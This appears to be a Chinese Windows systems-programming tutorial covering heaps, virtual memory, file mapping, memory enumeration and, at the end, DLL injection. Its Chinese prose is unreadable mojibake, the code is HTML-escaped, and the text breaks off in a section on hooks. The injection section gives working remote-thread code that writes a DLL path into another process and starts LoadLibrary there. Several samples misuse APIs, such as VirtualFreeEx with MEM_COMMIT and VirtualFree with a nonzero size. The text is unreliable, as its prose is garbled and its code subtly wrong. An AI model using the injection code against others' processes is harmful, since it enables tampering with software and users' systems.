ä¸€ä¸ªè¿›ç¨‹çš„è™šæ‹Ÿç©ºé—´åªæœ‰ä½¿ç”¨ä¸€éƒ¨åˆ†ä¸ç‰©ç†å†…å­˜æœ‰æ˜ å°„å…³ç³»ï¼Œå¹¶ä¸”windowså°½é‡ä¿è¯å¯¹äºä¸åŒè¿›ç¨‹çš„åŒä¸€ä»½æ•°æ®ï¼Œåœ¨ç‰©ç†å†…å­˜ä¸­åªæœ‰ä¸€ä»½ï¼Œåˆ†åˆ«æ˜ å°„åˆ°å¤šä¸ªè¿›ç¨‹ä¸­ã€‚ä»è€ŒèŠ‚çº¦å†…å­˜ã€‚e) å½“å„ä¸ªè¿›ç¨‹æ‰€ä½¿ç”¨çš„å†…å­˜æ•°é‡è¶…å‡ºç‰©ç†å†…å­˜çš„æ—¶å€™ï¼Œæ“ä½œç³»ç»Ÿè¿˜èƒ½å¤Ÿå°†ç‰©ç†å†…å­˜ä¸­æš‚æ—¶ç”¨ä¸åˆ°çš„æ•°æ®äº¤æ¢åˆ°ç¡¬ç›˜ä¸­ã€‚\nå †çš„ç®¡ç†\n\n\nAPI\nè¯´æ˜\n\n\n\nHeapCreate\nåœ¨è¿›ç¨‹ä¸­åˆ›å»ºä¸€ä¸ªå †ï¼Œè¿”å›ä¸€ä¸ªå †å¥æŸ„\n\n\nGetProcessHeap\nè·å–å½“å‰è¿›ç¨‹ä¸­çš„ä¸€ä¸ªå †ï¼Œè¿”å›ä¸€ä¸ªå¥æŸ„\n\n\nGetProcessHeaps\nè·å–è¿›ç¨‹ä¸­çš„æ‰€ç”¨å †ï¼Œå †çš„æ•°é‡å’Œå †çš„å„ä¸ªå¥æŸ„\n\n\nHeapAlloc\nä»æŒ‡å®šçš„å †ä¸Šåˆ†é…å—\n\n\nHeapReAlloc\né‡æ–°åˆ†é…å†…å­˜ï¼Œæ”¹å˜å·²ç»åˆ†é…å¥½çš„å †å†…å­˜å—å¤§å°\n\n\nGetSystemInfo\nè·å–ç³»ç»Ÿä¿¡æ¯\n\n\nHeapSize\nè·å–æŒ‡å®šå †çš„å¤§å°\n\n\nHeapFree\né‡Šæ”¾HeapAllocå’ŒHeapReAllocç”³è¯·çš„å†…å­˜\n\n\nHeapDestroy\né”€æ¯ç”±HeapCreateåˆ›å»ºçš„å †\n\n\nCreateToolhelp32Snapshot\nå¯ä»¥åˆ†åˆ«åˆ›å»ºè¿›ç¨‹ã€çº¿ç¨‹ã€è¿›ç¨‹æ¨¡å—ã€è¿›ç¨‹å †çš„å¿«ç…§\n\n\nHeap32First\nç”¨æ¥é¦–æ¬¡è°ƒç”¨ï¼Œè·å¾—ç¬¬ä¸€ä¸ªå †å¯¹è±¡çš„ä¿¡æ¯\n\n\nHeap32Next\nä»¥åçš„è°ƒç”¨ç”±ä»–æ¥å®Œæˆï¼Œä¸æ–­çš„è·å–å †å¯¹è±¡ä¿¡æ¯\n\n\nåŸºæœ¬ä½¿ç”¨void Test()\n&#123;\n\t&#x2F;&#x2F;æˆ‘ä»¬ä¸åˆ›å»ºå †ï¼Œè¿›ç¨‹ä¹Ÿä¼šæœ‰é»˜è®¤çš„å †\n\tHANDLE      hHeap &#x3D; GetProcessHeap(); &#x2F;&#x2F; è·å–é»˜è®¤å †\n\tSYSTEM_INFO si;                       &#x2F;&#x2F;ç³»ç»Ÿä¿¡æ¯\n\tGetSystemInfo(&amp;si);                   &#x2F;&#x2F; è·å–ç³»ç»Ÿä¿¡æ¯\n\t&#x2F;&#x2F;åœ¨å †ä¸Šåˆ†é…3ä¸ªé¡µé¢å¤§å°çš„å†…å­˜\n\tLPVOID lpMem &#x3D; HeapAlloc(hHeap, HEAP_ZERO_MEMORY, si.dwPageSize * 3);\n\tHeapFree(hHeap, 0, lpMem);\n\t&#x2F;&#x2F;é»˜è®¤å †ï¼Œä¸åº”è¯¥å»é”€æ¯å®ƒ\n\t&#x2F;&#x2F;HeapDestroy( hHeap );\n&#125;\n\n\n\nint main()\n&#123;\n\tTest();\n\t&#x2F;&#x2F;1 åˆ›å»ºä¸€ä¸ªå †\n\tHANDLE      hHeap &#x3D; HeapCreate(0, 0, 0);\n\tSYSTEM_INFO si;     &#x2F;&#x2F;ç³»ç»Ÿä¿¡æ¯\n\tGetSystemInfo(&amp;si); &#x2F;&#x2F; è·å–ç³»ç»Ÿä¿¡æ¯ï¼Œä¸»è¦æ˜¯ä¸ºäº†è·å–å†…å­˜åˆ†é¡µå¤§å°\n\t&#x2F;&#x2F;åœ¨å †ä¸Šåˆ†é…3ä¸ªé¡µé¢å¤§å°çš„å†…å­˜\n\tLPVOID lpMem &#x3D; HeapAlloc(hHeap, HEAP_ZERO_MEMORY, si.dwPageSize * 3);\n\t&#x2F;&#x2F;ã€‚ã€‚ã€‚ã€‚ã€‚\n\t&#x2F;&#x2F;é‡Šæ”¾å †å†…å­˜\n\tHeapFree(hHeap, 0, lpMem);\n\t&#x2F;&#x2F;é”€æ¯å †ï¼Œè¿™ä¸ªå †ï¼Œæ²¡æœ‰ä»»ä½•éœ€è¦ä½¿ç”¨çš„å†…å­˜äº†ï¼Œå°±é”€æ¯\n\tHeapDestroy(hHeap);\n\n&#125;\n\nä½¿ç”¨åœºæ™¯ï¼š\nä¸€èˆ¬æƒ…å†µä¸‹ï¼Œå’±ä¹ˆéƒ½æ˜¯ä½¿ç”¨mallocæˆ–è€…newã€‚å¦‚æœæœ‰ä»¥ä¸‹åœºæ™¯å¯ä»¥å°è¯•ä½¿ç”¨å †ï¼Œå‡å¦‚å’±ä»¬çš„ç¨‹åºéœ€è¦å¤§é‡çš„å»ç”³è¯·å°å—çš„å†…å­˜ï¼Œç®¡ç†è¿™äº›åœ°å€ï¼Œå°±ä¼šæ¯”è¾ƒéº»çƒ¦ï¼Œæ­¤æ—¶å°±å¯ä»¥ä½¿ç”¨è‡ªå·±åˆ›å»ºçš„å †ï¼Œåœ¨ç”¨å®Œäº†å†…å­˜ä¹‹åï¼Œå»ç›´æ¥é”€æ¯å †ï¼Œæ­¤æ—¶å†…å­˜å°±è‡ªåŠ¨é‡Šæ”¾äº†ï¼Œä¹Ÿå°±å…å»äº†æŒ¨ä¸ªå»é‡Šæ”¾çš„éº»çƒ¦ã€‚\néå†å †å’Œéå†è¿›ç¨‹ï¼Œçº¿ç¨‹ä¸€è‡´çš„ï¼Œä½¿ç”¨å¿«ç…§å»éå†å³å¯ã€‚\nè™šæ‹Ÿå†…å­˜ç®¡ç†å‡½æ•°\n\n\nä½œç”¨\nå‡½æ•°å\nè¯´æ˜\n\n\n\nåˆ†é…\nVirtualAlloc\nåˆ†é…æˆ–é¢„å®šä¸€å—è™šæ‹Ÿå†…å­˜\n\n\n\nVirtualAllocEx\nå¯ä»¥åœ¨å…¶ä»–è¿›ç¨‹åˆ†é…æˆ–é¢„å®šä¸€å—è™šæ‹Ÿå†…å­˜\n\n\né‡Šæ”¾\nVirtualFree\nå°†ä¸€å—è™šæ‹Ÿå†…å­˜é‡Šæ”¾\n\n\n\nVirtualFreeEX\nå¯ä»¥å°†é‡Šæ”¾å…¶ä»–è¿›ç¨‹çš„å†…å­˜\n\n\né”å®šä¸è§£é”\nVirtualLook\nå¯ä»¥å°†å†…å­˜é”å®šï¼Œä¸èƒ½äº¤æ¢æ•°æ®åˆ°ç¡¬ç›˜\n\n\n\nVirtualUnlook\nä¸ºå†…å­˜è§£é”\n\n\nä¿®æ”¹ä¿æŠ¤å±æ€§\nVirtualProtect\nä¿®æ”¹ä¸€å—è™šæ‹Ÿå†…å­˜çš„å±æ€§\n\n\n\nVirtualProtectEx\nå¯ä»¥ä¿®æ”¹å…¶ä»–å†…å­˜çš„å±æ€§\n\n\nè¯»å†™å…¶ä»–è¿›ç¨‹å†…å­˜\nReadProcessMemory\nè¯»å†™è¿œç¨‹è¿›ç¨‹çš„å†…å­˜æ•°æ®\n\n\n\nWriteProcessMemory\nå°†æ•°æ®å†™å…¥è¿œç¨‹è¿›ç¨‹å†…å­˜\n\n\næŸ¥è¯¢å†…å­˜çŠ¶æ€\nVirtualQuery\næŸ¥è¯¢å†…å­˜çŠ¶æ€\n\n\n\nVirtualQueryEx\nå¯ä»¥æŸ¥è¯¢å…¶ä»–å†…å­˜çŠ¶æ€\n\n\nå®‰å…¨å±æ€§\n\n\nå±æ€§\nå€¼\næè¿°\n\n\n\nPAGE_NOACCESS\n0x01\nä¸å¯è®¿é—®\n\n\nPAGE_READONLY\n0x02\nåªè¯»\n\n\nPAGE_READWRITE\n0x04\nå¯è¯»å¯å†™\n\n\nPAGE_WRITECOPY\n0x08\nå¯å†™å¯è¯»\n\n\nPAGE_EXECUTE\n0x10\nå¯æ‰§è¡Œ\n\n\nPAGE_EXECUTE_READ\n0x20\nå¯è¯»å¯æ‰§è¡Œ\n\n\nPAGE_EXECUTE_READWRITE\n0x40\nå¯è¯»å¯å†™å¯æ‰§è¡Œ\n\n\nPAGE_EXECUTE_WRITECOPY\n0x80\nå¯æ‰§è¡Œï¼Œå†™æ—¶å¤åˆ¶\n\n\nPAGE_GUARD\n0x100\n\n\n\nPAGE_NOCACHE\n0x200\n\n\n\nPAGE_WRITECOMBINE\n0x400\n\n\n\nPAGE_GRAPHICS_NOACCESS\n0x0800\n\n\n\nPAGE_GRAPHICS_READONLY\n0x1000\n\n\n\nPAGE_GRAPHICS_READWRITE\n0x2000\n\n\n\nPAGE_GRAPHICS_EXECUTE\n0x4000\n\n\n\nPAGE_GRAPHICS_EXECUTE_READ\n0x8000\n\n\n\nPAGE_GRAPHICS_EXECUTE_READWRITE\n0x10000\n\n\n\nPAGE_GRAPHICS_COHERENT\n0x20000\n\n\n\nPAGE_ENCLAVE_THREAD_CONTROL\n0x80000000\n\n\n\nPAGE_REVERT_TO_FILE_MAP\n0x80000000\n\n\n\nPAGE_TARGETS_NO_UPDATE\n0x40000000\n\n\n\nPAGE_TARGETS_INVALID\n0x40000000\n\n\n\nPAGE_ENCLAVE_UNVALIDATED\n0x20000000\n\n\n\nPAGE_ENCLAVE_DECOMMIT\n0x10000000\n\n\n\nç”³è¯·å’Œé‡Šæ”¾int main()\n&#123;\n\t&#x2F;&#x2F;1 ç”³è¯·\n\tLPVOID lpvResult &#x3D; VirtualAlloc(\n\t\tNULL,\n\t\t4097,              &#x2F;&#x2F; 4KB * 1\n\t\tMEM_RESERVE | MEM_COMMIT,   &#x2F;&#x2F; é¢„å®šå¹¶è°ƒæ‹¨å†…å­˜\n\t\tPAGE_READWRITE);            &#x2F;&#x2F; å¯è¯»å†™\n\t&#x2F;&#x2F;ä½¿ç”¨\n\twcscpy_s((LPWSTR)lpvResult, wcslen(L&quot;Hello!&quot;)+2, L&quot;World!&quot;);\n\tMessageBox(NULL, (LPWSTR)lpvResult, NULL, MB_OK);\n\t&#x2F;&#x2F;é‡Šæ”¾\n\tVirtualFree(lpvResult, 1, MEM_RELEASE);\n&#125;\n\nä¿®æ”¹ä¿æŠ¤å±æ€§int main()\n&#123;\n\tchar* p &#x3D; (char*)&quot;hello World&quot;;\n\tDWORD dwNewProtect &#x3D; PAGE_READWRITE;\n\tDWORD dwOldProtect &#x3D; 0;\n\tVirtualProtect(p, 1, dwNewProtect, &amp;dwOldProtect);\n\tp[0] &#x3D; &#39;m&#39;;\n\tp[1] &#x3D; &#39;k&#39;;\n\tp[2] &#x3D; &#39;m&#39;;\n&#125;\n\næ–‡ä»¶æ˜ å°„å¯ä»¥å°†æ–‡ä»¶ç›´æ¥æ˜ å°„è¿›å†…å­˜çš„ä¸€ç§æŠ€æœ¯ã€‚\n\n\n\nAPI\nè¯´æ˜\n\n\n\nGetSystemInfo\nè·å–ç³»ç»Ÿä¿¡ä¿¡æ¯ï¼Œç”¨äºç¡®å®šåˆ†é…ç²’åº¦\n\n\nCreateFileMapping\nåˆ›å»ºä¸€ä¸ªmappingå¯¹è±¡\n\n\nOpenFileMapping\næ‰“å¼€å·²å‘½åçš„mappingå¯¹è±¡ï¼ˆå¯è·¨è¿›ç¨‹ï¼‰\n\n\nUnmapViewOfFile\nå–æ¶ˆæ–‡ä»¶æ˜ å°„\n\n\nMapViewOfFile\nå°†mappingå¯¹è±¡çš„æ–‡ä»¶æ˜ å°„åˆ°å†…å­˜\n\n\nFlushViewOfFile\nå°†æ˜ å°„åˆ°å†…å­˜çš„æ–‡ä»¶å†™å›åˆ°ç¡¬ç›˜\n\n\næœ‰ä¸¤ä¸ªä½œç”¨ï¼š\n1 æ“ä½œæ–‡ä»¶æ¯”è¾ƒæ–¹ä¾¿\nint main()\n&#123;\n\t&#x2F;&#x2F;1. æ‰“å¼€æ–‡ä»¶ï¼Œå¾—åˆ°ä¸€ä¸ªæ–‡ä»¶å¥æŸ„\n\tHANDLE hFile &#x3D;  CreateFile(\n\t\tL&quot;D:\\\\test\\\\123.txt&quot;,\n\t\tGENERIC_READ | GENERIC_WRITE,\n\t\tNULL,\n\t\tNULL,\n\t\tOPEN_EXISTING,\n\t\tFILE_ATTRIBUTE_NORMAL,\n\t\t0\n\t);\n\t&#x2F;&#x2F;2. åˆ›å»ºä¸€ä¸ªæ–‡ä»¶æ˜ å°„å¯¹è±¡ï¼Œå’Œæ–‡ä»¶å¥æŸ„å…³è”å¦‚æœï¼Œè¦è¶…è¿‡æ–‡ä»¶å¤§å°çš„è¯\n\t&#x2F;&#x2F;   åˆ›å»ºçš„æ—¶å€™ï¼Œå°±éœ€è¦å†™ä¸€ä¸ªå¤§å°ã€‚\n\t&#x2F;&#x2F;   \n\tHANDLE hFileMapping  &#x3D; \n\t\tCreateFileMapping(hFile, NULL, PAGE_READWRITE, 0, 100, 0);\n\t&#x2F;&#x2F;3. å°†æ–‡ä»¶æ˜ å°„åˆ°å†…å­˜\n\tchar *p &#x3D; (char*)MapViewOfFile(hFileMapping, FILE_MAP_ALL_ACCESS, 0,0, 0);\n\n\t&#x2F;&#x2F;4. è¯»å–æˆ–è€…å†™å…¥\n\tstrcpy_s(p, 100,&quot;15pb hello  15pb hello&quot;);\n\n\t&#x2F;&#x2F;5. æ–‡ä»¶æ˜ å°„çš„å†™å…¥ï¼Œä¼šè‡ªåŠ¨åˆ·ï¼Œä¹Ÿå¯ä»¥æ‰‹åŠ¨åˆ· \n\tFlushViewOfFile(p, 0);\n\t&#x2F;&#x2F;6. å…³é—­å¥æŸ„\n\tCloseHandle(hFileMapping);\n\tCloseHandle(hFile);\n\n&#125;\n\n2 æ–‡ä»¶æ˜ å°„æ˜¯ä¸€ä¸ªå†…æ ¸å¯¹è±¡ï¼Œå¯ä»¥åœ¨å¤šè¿›ç¨‹ä¸­å»è®¿é—®ï¼Œæ‰€ä»¥æ–‡ä»¶æ˜ å°„ä¹Ÿæ˜¯ä¸€ç§è¿›ç¨‹é—´é€šè®¯æœºåˆ¶ã€‚\nè¿›ç¨‹é—´é€šè®¯é€šè®¯Aç«¯&#x2F;&#x2F; 06_è¿›ç¨‹é—´é€šè®¯.cpp : æ­¤æ–‡ä»¶åŒ…å« &quot;main&quot; å‡½æ•°ã€‚ç¨‹åºæ‰§è¡Œå°†åœ¨æ­¤å¤„å¼€å§‹å¹¶ç»“æŸã€‚\n&#x2F;&#x2F;\n\n#include &lt;iostream&gt;\n#include &lt;Windows.h&gt;\nint main()\n&#123;\n\t&#x2F;&#x2F;1 åˆ›å»ºæ–‡ä»¶æ˜ å°„\n\tHANDLE hFileMapping &#x3D;\n\t\tCreateFileMapping(\n\t\t\tINVALID_HANDLE_VALUE, \n\t\t\tNULL, PAGE_READWRITE, \n\t\t\t0, \n\t\t\t100,\n\t\t\tL&quot;hello 15pb&quot;&#x2F;&#x2F;èµ·äº†åå­—ï¼Œåˆ«çš„è¿›ç¨‹æ‰èƒ½æ‰“å¼€å®ƒ\n\t\t);\n\t&#x2F;&#x2F;2 æ˜ å°„å†…å­˜\n\tchar* pBuf &#x3D; (char*)MapViewOfFile(hFileMapping, FILE_MAP_ALL_ACCESS, 0, 0, 16);\n\n\tpBuf[0] &#x3D; 1;\n\n\t&#x2F;&#x2F;3 æ—¶åˆ»æ£€æµ‹ï¼Œç¬¬ä¸€ä¸ªå­—èŠ‚æ˜¯å¦è¢«ä¿®æ”¹äº†\n\twhile (pBuf[0] &#x3D;&#x3D; 1)\n\t&#123;\n\n\t&#125;\n\t&#x2F;&#x2F;4 å¦‚æœè¢«ä¿®æ”¹äº†ï¼Œé‚£ä¹ˆå°±ç»“æŸ\n\tprintf(&quot;æ•°æ®å·²ç»è¢«æ›´æ”¹&quot;);\n\tCloseHandle(hFileMapping);\n&#125;\n\né€šè®¯Bç«¯#include &lt;iostream&gt;\n#include &lt;Windows.h&gt;\nint main()\n&#123;\n\t&#x2F;&#x2F; 1. æ‰“å¼€æ–‡ä»¶Mapping\n\tHANDLE hMapFile &#x3D; OpenFileMapping(FILE_MAP_ALL_ACCESS,\n\t\tFALSE, L&quot;hello 15pb&quot;);\n\t&#x2F;&#x2F;2. æ˜ å°„åˆ°å†…å­˜\n\tchar* pBuf &#x3D; (char*)MapViewOfFile(hMapFile, FILE_MAP_ALL_ACCESS,\n\t\t0, 0, 0);\n\t&#x2F;&#x2F;3. ä¿®æ”¹æ•°æ®\n\tpBuf[0] &#x3D; 0;\n\t&#x2F;&#x2F;4. é€šè®¯å®Œæ¯•ï¼Œé€€å‡º\n\tprintf(&quot;æ•°æ®å·²ç»æ›´æ”¹å®Œæ¯•äº†&quot;);\n\tCloseHandle(hMapFile);\n&#125;\n\nè™šæ‹Ÿå†…å­˜çš„éå†SIZE_T WINAPI VirtualQueryEx(\n  _In_      HANDLE hProcess,   &#x2F;&#x2F; è¿›ç¨‹å¥æŸ„\n  _In_opt_  LPCVOID lpAddress, &#x2F;&#x2F; æŸ¥è¯¢åœ°å€\n  _Out_     PMEMORY_BASIC_INFORMATION lpBuffer,\n  _In_      SIZE_T dwLength    &#x2F;&#x2F; ä¼ å‡ºç»“æ„ä½“çš„å¤§å°\n);\n\ntypedef struct _MEMORY_BASIC_INFORMATION &#123;\n    PVOID  BaseAddress;       &#x2F;&#x2F; å°†å‚æ•°å‘ä¸‹å–æ•´åˆ°é¡µé¢å¤§å°\n    PVOID  AllocationBase;    &#x2F;&#x2F; åŒºåŸŸåœ°å€ï¼Œæ­¤åŒºåŸŸåŒ…å«ä¼ å…¥åœ°å€\n    DWORD  AllocationProtect; &#x2F;&#x2F; æ­¤åŒºåŸŸåœ¨é¢„å®šæ—¶çš„ä¿æŠ¤å±æ€§\n    SIZE_T RegionSize;        &#x2F;&#x2F; åŒºåŸŸçš„å¤§å°\n    DWORD  State;             &#x2F;&#x2F; åŒºåŸŸçš„é¡µé¢çŠ¶æ€[æ³¨1]\n    DWORD  Protect;           &#x2F;&#x2F; é¡µé¢ä¿æŠ¤å±æ€§\n    DWORD  Type;              &#x2F;&#x2F; é¡µé¢ç±»å‹[æ³¨2]\n&#125; MEMORY_BASIC_INFORMATION, *PMEMORY_BASIC_INFORMATION;\n\né¡µé¢çš„çŠ¶æ€\n\n\nçŠ¶æ€\nå€¼\nè¯´æ˜\n\n\n\nç©ºé—²çš„(Free)\n0x00010000\nè¿›ç¨‹ä¸èƒ½è®¿é—®è¿™ç§é¡µé¢ï¼Œæ­¤é¡µé¢è¿˜æ²¡æœ‰è¢«åˆ†é…ã€‚\n\n\nä¿ç•™çš„(reserve)\n0x00002000\nè¿™ä¸ªé¡µé¢è¢«é¢„å®šäº†ã€‚ä½†æ˜¯è¿˜æœªä¸ç‰©ç†å†…å­˜æ˜ å°„ï¼Œå› æ­¤è¿™é‡Œä¹Ÿæ˜¯ä¸èƒ½è®¿é—®çš„ã€‚\n\n\næäº¤çš„(commit)\n0x00001000\nå†…å­˜å·²ç»è¢«åˆ†é…äº†ï¼Œå¹¶ä¸”ä¹Ÿä¸ç‰©ç†å­˜å‚¨å™¨æ˜ å°„äº†ï¼Œè¿›ç¨‹å·²ç»å¯ä»¥è®¿é—®è¿™é‡Œ\n\n\né¡µé¢ç±»å‹\n\n\næ˜ å°„æ–¹å¼\næè¿°\n\n\n\nprivate\nè¿›ç¨‹ç§æœ‰å†…å­˜,ä¸è¢«å…¶ä»–è¿›ç¨‹æ‰€å…±äº«, ä¸€èˆ¬æ˜¯å †,æ ˆ\n\n\nmapped\nä»åˆ«çš„è¿›ç¨‹å†…å­˜æ˜ å°„è€Œæ¥\n\n\nimage\nä»ç¨‹åºçš„PEæ˜ åƒæ˜ å°„è€Œæ¥,ä¸€èˆ¬æ˜¯æ˜ åƒçš„åŒºæ®µ.\n\n\néå†ä»£ç #include &lt;Windows.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;TlHelp32.h&gt;\n#include &lt;string&gt;\nusing std::wstring;\nvoid EnumProcess();\nvoid EnumVirtualMemroy(HANDLE Process);\nMEMORY_BASIC_INFORMATION VirtualMemroy;\nint main()\n&#123;\n\tEnumProcess();\n\t\n\treturn 0;\n&#125;\n\n&#x2F;&#x2F;éå†è¿›ç¨‹\nvoid EnumProcess()\n&#123;\n\twstring buffer;\n\n\t&#x2F;&#x2F; 2. åˆ›å»ºä¸€ä¸ªå¿«ç…§ç”¨äºéå†è¿›ç¨‹ï¼Œå‚æ•°2å¯ä»¥ç•™ç©º\n\tHANDLE Snapshot &#x3D; CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);\n\n\t&#x2F;&#x2F; 3. åˆ›å»ºä¸€ä¸ªç”¨äºä¿å­˜è¿›ç¨‹ä¿¡æ¯çš„ç»“æ„ä½“\n\tPROCESSENTRY32 ProcessInfo &#x3D; &#123; sizeof(PROCESSENTRY32) &#125;;\n\n\t&#x2F;&#x2F; 4. å°è¯•éå†ç¬¬ä¸€ä¸ªè¿›ç¨‹çš„ä¿¡æ¯ï¼ŒæˆåŠŸå°±ç»§ç»­ï¼Œå¤±è´¥å°±è·³è¿‡\n\tif (Process32First(Snapshot, &amp;ProcessInfo))\n\t&#123;\n\t\tdo &#123;\n\t\t\t\t&#x2F;&#x2F; 5.5.2 é€šè¿‡æŒ‡å®šçš„æƒé™è·å–è¿›ç¨‹å¥æŸ„\n\t\t\t\tHANDLE Process &#x3D; OpenProcess(PROCESS_QUERY_INFORMATION,FALSE, ProcessInfo.th32ProcessID);\n\t\t\t\tif (Process&amp;&amp; Process !&#x3D; INVALID_HANDLE_VALUE)\n\t\t\t\t&#123;\n\t\t\t\t\t&#x2F;&#x2F; 5.5.3 é€šè¿‡APIæŸ¥è¯¢åˆ°è¿›ç¨‹å¯¹åº”çš„Exeçš„è·¯å¾„ï¼Œè·å–ä¸åˆ°æ˜¯å› ä¸ºæƒé™ä¸å¤Ÿ\n\t\t\t\t\t&#x2F;&#x2F;QueryFullProcessImageName(Process, 0, ImagePath, &amp;PathSize);\n\t\t\t\t\tprintf(&quot;%ls\\n&quot;, ProcessInfo.szExeFile);\n\t\t\t\t\tEnumVirtualMemroy(Process);\n\t\t\t\t\t&#x2F;&#x2F; 5.5.4 å…³é—­å¥æŸ„å¹¶æ‰“å°æ•°æ®\n\t\t\t\t\tCloseHandle(Process);\n\t\t\t\t&#125;\n\n\t\t\t&#x2F;&#x2F; 6. å°è¯•éå†è¿›ç¨‹å¿«ç…§å†…çš„ä¸‹ä¸€ä¸ªè¿›ç¨‹\n\t\t&#125; while (Process32Next(Snapshot, &amp;ProcessInfo));\n\t&#125;\n\n&#125;\n&#x2F;&#x2F;è™šæ‹Ÿå†…å­˜çš„éå†\nvoid EnumVirtualMemroy(HANDLE Process)\n&#123;\n\tint dwLength &#x3D; sizeof(MEMORY_BASIC_INFORMATION);\n\tLPVOID Base &#x3D; NULL;\n\twhile (Base&lt;(LPVOID)0x7fffffff)\n\t&#123;\n\t\tVirtualQueryEx(Process, Base, &amp;VirtualMemroy, dwLength);\n\n\t\tBase &#x3D; (LPVOID)((DWORD)Base + VirtualMemroy.RegionSize);\n\n\t\tprintf(&quot;\\tç±»å‹ï¼š%d\\tå±æ€§ï¼š%d\\tçŠ¶æ€ï¼š%d\\tå¤§å°ï¼š%d\\n&quot;,\n\t\t\tVirtualMemroy.Type,\n\t\t\tVirtualMemroy.AllocationProtect,\n\t\t\tVirtualMemroy.State,\n\t\t\tVirtualMemroy.RegionSize\n\t\t);\n\t&#125;\n&#125;\n\nDllæ³¨å…¥æ³¨ï¼šèŒä¸šé»‘å®¢çš„å¿…ä¿®è¯¾\né‡ç‚¹å†…å®¹ï¼‰\n1 ä»€ä¹ˆæ˜¯DLLæ³¨å…¥ï¼Ÿï¼Ÿä¸ºä»€ä¹ˆè¦DLLæ³¨å…¥ï¼Ÿï¼Ÿ\nåœ¨ä¸€ä¸ªæœ¬æ¥ä¸éœ€è¦åŠ è½½æ­¤DLLçš„è¿›ç¨‹ä¸­ï¼Œå¼ºè¡Œçš„ä½¿å…¶åŠ è½½æ­¤DLLæ–‡ä»¶ã€‚é‚£ä¹ˆè¿™ä¸ªå°±å«åšDLLæ³¨å…¥æŠ€æœ¯ã€‚\næˆ‘ä»¬åœ¨å‘ä¸€ä¸ªè¿›ç¨‹ä¸­æ³¨å…¥æˆ‘ä»¬è‡ªå·±çš„DLLï¼Œç›¸å½“äºåœ¨å¯¹æ–¹çš„è¿›ç¨‹ä¸­åŠ å…¥äº†æˆ‘ä»¬è‡ªå·±çš„ä»£ç ï¼Œå¯ä»¥ä¿®æ”¹å¯¹æ–¹ç¨‹åºçš„åŠŸèƒ½ã€‚\næ¸¸æˆè¾…åŠ©ï¼Œè¾“å…¥æ³•ï¼Œå¯¹äºè½¯ä»¶è¡Œä¸ºçš„æ‹¦æˆªã€‚\n2 DLLæ³¨å…¥çš„æ–¹å¼æœ‰å“ªäº›ï¼Ÿï¼Ÿ\nè¿œç¨‹çº¿ç¨‹æ³¨å…¥\næ¶ˆæ¯é’©å­æ³¨å…¥\næ³¨å†Œè¡¨æ³¨å…¥\nAPCæ³¨å…¥\nè¾“å…¥æ³•æ³¨å…¥\nè¿œç¨‹çº¿ç¨‹æ³¨å…¥#include &lt;Windows.h&gt;\n#include &lt;stdio.h&gt;\n\n#define DLLPATH  L&quot;DLLåœ°å€&quot;\nint main()\n&#123;\n\t&#x2F;&#x2F;é€šè¿‡IDè·å¾—ç›®æ ‡å¥æŸ„\n\tHANDLE hHandle &#x3D; OpenProcess(PROCESS_ALL_ACCESS,FALSE,9740);\n\t&#x2F;&#x2F;å…ˆè·å–å­—ç¬¦ä¸²é•¿åº¦\n\tint  nLength &#x3D; wcslen(DLLPATH);\n\t&#x2F;&#x2F;åœ¨ç›®æ ‡è¿›ç¨‹ä¸­ç”³è¯·ä¸€å—ç©ºé—´\n\tLPVOID address &#x3D; VirtualAllocEx(hHandle,0, nLength*2+2,MEM_COMMIT,PAGE_READWRITE);\n\t&#x2F;&#x2F;å°†DLLåå­—å†™å…¥åˆ°ç›®æ ‡è¿›ç¨‹ä¹‹å‰è¿˜éœ€è¦ä¸€ä¸ªå‚æ•°æ˜¯è¿”å›çš„å®é™…å†™å…¥å¤§å°\n\tDWORD dwConst &#x3D; 0;\n\t&#x2F;&#x2F;å°†DLLåå­—å†™å…¥åˆ°ç›®æ ‡è¿›ç¨‹ç©ºé—´\n\tWriteProcessMemory(hHandle, address,DLLPATH, nLength * 2 + 2, &amp;dwConst);\n\t&#x2F;&#x2F;åˆ›å»ºè¿œç¨‹çº¿ç¨‹\n\tHANDLE hRhread &#x3D; CreateRemoteThread(hHandle,0,0,(LPTHREAD_START_ROUTINE)LoadLibrary, address,0,0);\n\t&#x2F;&#x2F;ç­‰å¾…çº¿ç¨‹æ‰§è¡Œå®Œæˆ\n\tWaitForSingleObject(hRhread,-1);\n\t&#x2F;&#x2F;é”€æ¯åœ¨ç›®æ ‡è¿›ç¨‹ç”³è¯·çš„ç©ºé—´\n\tVirtualFreeEx(hHandle, address, nLength * 2 + 2,MEM_COMMIT);\n\t&#x2F;&#x2F;çº¿ç¨‹è®¡æ•°-1\n\tCloseHandle(hRhread);\n\treturn 0;\n&#125;\n\n4 å…³äº64ä½çš„æ³¨å…¥\n32ä½çš„dllæ­£å¸¸æƒ…å†µåªèƒ½æ³¨å…¥åˆ°32ä½ç¨‹åºä¸­ï¼Œæ³¨å…¥ç¨‹åºä¹Ÿåº”è¯¥æ˜¯32ä½ï¼Œ64ä½çš„dllæ­£å¸¸æƒ…å†µåªèƒ½æ³¨å…¥åˆ°64ä½çš„ç¨‹åºä¸­ï¼Œæ³¨å…¥ç¨‹åºä¹Ÿåº”è¯¥æ˜¯64ä½ã€‚\næ¶ˆæ¯é’©å­æ³¨å…¥ä»€ä¹ˆæ˜¯Hookï¼Œè¿™ä¸ªæ¦‚å¿µåº”è¯¥ä»ä½•è¯´èµ·ï¼Ÿï¼Ÿï¼Ÿ\nHookï¼šæ˜¯é’©å­çš„æ„æ€\nHookæŠ€æœ¯ä¸»è¦æŒ‡çš„æ˜¯æ‹¦æˆªç¨‹åºåŸæœ‰çš„ä¿¡æ¯ï¼Œæ•°æ®ï¼Œä»£ç ï¼Œ\n1 ä½¿å¾—ä½ æœ‰æœºä¼šå¯¹æ‹¦æˆªåˆ°çš„ä¿¡æ¯æ•°æ®åšå¤„ç†ã€‚ç„¶åå†äº¤ç»™åŸæ¥çš„ç¨‹åºå»ä½¿ç”¨ï¼Œä»è€Œèƒ½å¤Ÿæˆªè·åˆ°ç¨‹åºçš„å…³é”®ä¿¡æ¯ã€‚å¯ä»¥æŸ¥çœ‹ï¼Œä¹Ÿå¯ä»¥ä¿®æ”¹ã€‚\n2 èƒ½å¤Ÿä¿®æ”¹ç¨‹åºçš„éƒ¨åˆ†åŠŸèƒ½ã€‚\n2 